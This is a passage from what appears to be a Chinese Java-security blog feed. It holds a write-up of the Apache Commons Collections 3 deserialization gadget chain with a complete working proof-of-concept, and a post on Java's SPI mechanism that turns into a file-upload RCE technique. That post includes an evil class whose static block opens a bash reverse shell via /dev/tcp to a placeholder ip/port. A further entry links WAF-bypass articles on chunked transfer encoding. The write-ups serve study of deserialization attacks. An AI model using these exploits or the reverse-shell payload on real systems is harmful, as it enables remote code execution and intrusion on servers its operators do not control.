src="/2022/11/10/CommonsCollections2/image-20221010162150110.png" alt="image-20221010162150110"></p><p>那为什么不在第一个<code>priorityQueue.add(1)</code>时加入呢？因为在后面会有一个数组间的元素比较，而对象和数字，以及对象和对象是无法比较的。</p><p>接下来回答一下开头说的为什么<code>javassist</code>是个伪条件，跟下来其实发现<code>javassist</code>的作用就是构造一个恶意类，最后这个恶意类被转换成了字节码。而我们可以本地构造好恶意类的字节码，直接设置到<code>_bytecodes</code>，无需在目标主机上去通过<code>javassist</code>构造。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections3利用链分析</title>
      <link href="/2022/11/10/CommonsCollections3/"/>
      <url>/2022/11/10/CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链分析"><a href="#CommonsCollections3利用链分析" class="headerlink" title="CommonsCollections3利用链分析"></a>CommonsCollections3利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections3</code>利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">jdk 8u71 版本之前</span><br></pre></td></tr></table></figure><p>先看利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         <span class="title function_">newInstance</span><span class="params">()</span></span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>看到这个利用链，前半部分是<code>CommonsCollections1</code>的内容，而后半部分则是<code>CommonsCollection2</code>的内容，不过与<code>CommonsCollections2</code>不同的是，不再利用<code>invokerTransformer</code>类，而是使用<code>InstantiateTransformer</code>类。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>翻一下<code>ysoserial</code>中的源码<br><img src="/2022/11/10/CommonsCollections3/image-20221010171824472.png" alt="image-20221010171824472"></p><p>可以看见这次<code>transformers</code>由<code>ConstantTransformer</code>和<code>InstantiateTransformer</code>组成，其中<code>ConstantTransformer</code>传入的类为<code>TrAXFilter</code>，先跟进该类看看源码<br><img src="/2022/11/10/CommonsCollections3/image-20221010173113393.png" alt="image-20221010173113393"></p><p>发现该类会调用<code>newTransformer()</code>方法，接着继续跟进看<code>InstantiateTransformer()</code><br><img src="/2022/11/10/CommonsCollections3/image-20221010174156050.png" alt="image-20221010174156050"></p><p>在<code>InstantiateTransformer#transform()</code>方法中，通过<code>getConstructor()</code>方法进行实例化，而这里的<code>input</code>则是前面构造的<code>TrAXFilter</code>类，因此可以触发<code>TransformerImpl#newTransformer()</code>方法加载构造的恶意字节码进而命令执行。</p><p>在给出的利用链中可以看到触发<code>xxx.transform()</code>方法用的是前面<code>CommonsCollections1</code>中的<code>LazyMap.get()</code>方法，因此可以编写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections3</span> <span class="variable">commonsCollections3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections3</span>();</span><br><span class="line">        commonsCollections3.serialize();</span><br><span class="line">        commonsCollections3.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPI机制</title>
      <link href="/2022/11/10/SPI%E6%9C%BA%E5%88%B6/"/>
      <url>/2022/11/10/SPI%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h1><blockquote><p>最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml的反弹也是使用的SPI机制</p></blockquote><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，或者换句话说，<strong>SPI是一种服务发现机制</strong> </p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>定义接口 SpiService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现接口的方法的类SpiServiceA.java (<strong>需要注意SPI机制的实现类必须有一个无参构造方法</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceA</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceA.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiServiceB.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceB</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceB.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            init();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        ServiceLoader&lt;SpiService&gt; serviceLoader = ServiceLoader.load(SpiService.class);</span><br><span class="line">        Iterator&lt;SpiService&gt; iterator = serviceLoader.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">SpiService</span> <span class="variable">spiService</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            spiService.hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后定义META-INF/services<br><img src="https://user-images.githubusercontent.com/63966847/146678546-94e017c7-15a4-41f3-8082-4a0083c9b903.png" alt="image-20211219220826826"></p><p>然后run之后会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpiServiceA.Hello</span><br><span class="line">SpiServiceB.Hello</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>也就是我们可以通过spi机制去获得实现接口的类并且实例化去调用方法。</p><p>调用<strong>next方法</strong>的时候，实际调用到的是，lookupIterator.nextService。它通过反射的方式，创建实现类的实例并返回。</p><p><img src="https://user-images.githubusercontent.com/63966847/146678550-d158915b-fd15-4b20-a588-063ed76e7f8c.png" alt="image-20211219221208548"></p><p><img src="https://user-images.githubusercontent.com/63966847/146678553-aede21be-261d-4077-9f21-a5ca8d60c4ec.png" alt="image-20211219221324358"></p><p>需要注意一点如何获得 <strong>cn</strong>这个变量勒，也就是spi实例化什么东西？这个其实是在 <strong>META-INF/services/com.firebasky.spi.SpiService</strong>中配置的。</p><h2 id="新思路"><a href="#新思路" class="headerlink" title="新思路"></a>新思路</h2><p>那问题来了？</p><p><strong>环境存在路径穿越上传文件会造成rce?</strong> 会的。</p><p>如何实现？</p><p>我们上传META-INF/services/com.firebasky.spi.SpiService文件并且覆盖其中的值，写入我们的恶意类的全类名比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.firebasky.spi.evil</span><br></pre></td></tr></table></figure><p>然后我们在target\classes\下上传我们的evil.class，然后让其在一次的执行spi的操作。就可以成功rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#evil.java</span><br><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evial</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class 之后上传到target\classes\</p><p><img src="https://user-images.githubusercontent.com/63966847/146678561-9958bc94-f179-4440-97c4-fbdd2f7e03de.png" alt="image-20211219222014485"></p><p>在覆盖META-INF/services/com.firebasky.spi.SpiService</p><p><img src="https://user-images.githubusercontent.com/63966847/146678565-b5a349de-0fa3-4285-ae4c-3ce8a893bae7.png" alt="image-20211219222049642"></p><p>之后执行一下SpiTest。<br><img src="https://user-images.githubusercontent.com/63966847/146678572-60f7cfe5-32cf-4a40-9cca-b4a9d452d966.png" alt="image-20211219222131132"></p><p>其实也不是什么新思路,很多大师傅在实现写文件rce的时候就用到了,说不定ctf中可能遇到？？？</p><blockquote><p>参考： </p><p><a href="https://www.cnblogs.com/xrq730/p/11440174.html">https://www.cnblogs.com/xrq730/p/11440174.html</a></p><p><a href="https://www.jianshu.com/p/3a3edbcd8f24">https://www.jianshu.com/p/3a3edbcd8f24</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Thinking_in_java高级volatile</title>
      <link href="/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/"/>
      <url>/2022/11/10/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</url>
      
        <content type="html"><![CDATA[<p><a href="https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/">https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunked-coding-converter</title>
      <link href="/2022/11/10/chunked-coding-converter/"/>
      <url>/2022/11/10/chunked-coding-converter/</url>
      
        <content type="html"><![CDATA[<h1 id="chunked-coding-converter"><a href="#chunked-coding-converter" class="headerlink" title="chunked-coding-converter"></a>chunked-coding-converter</h1><p><a href="https://mp.weixin.qq.com/s/pM1ULCqNdQwSB7hcltrbtw">唯快不破的分块传输绕WAF</a></p><p><a href="https://mp.weixin.qq.com/s/2DDYyvsZ5HIQC0qGMK9znQ">Bypass WAF HTTP协议覆盖+分块传输组合绕过</a></p><p><a href="https://mp.weixin.qq.com/s/eDiiiVX4oF0LYG3Ia5P4mw">利用分块传输吊打所有WAF</a></p><p><a href="https://www.freebuf.com/news/193659.html">技术讨论 | 在HTTP协议层面绕过WAF</a></p><p><a href="https://gv7.me/articles/2019/chunked-coding-converter/">编写Burp分块传输插件绕WAF</a></p><p><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只有HTTP/1.1支持分块传输</span><br><span class="line">POST包都支持分块，不局限仅仅于反序列化和上传包</span><br><span class="line">Transfer-Encoding: chunked大小写不敏感</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> obsidian hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro之key的检测</title>
      <link href="/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
      <url>/2022/11/10/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/</url>
      
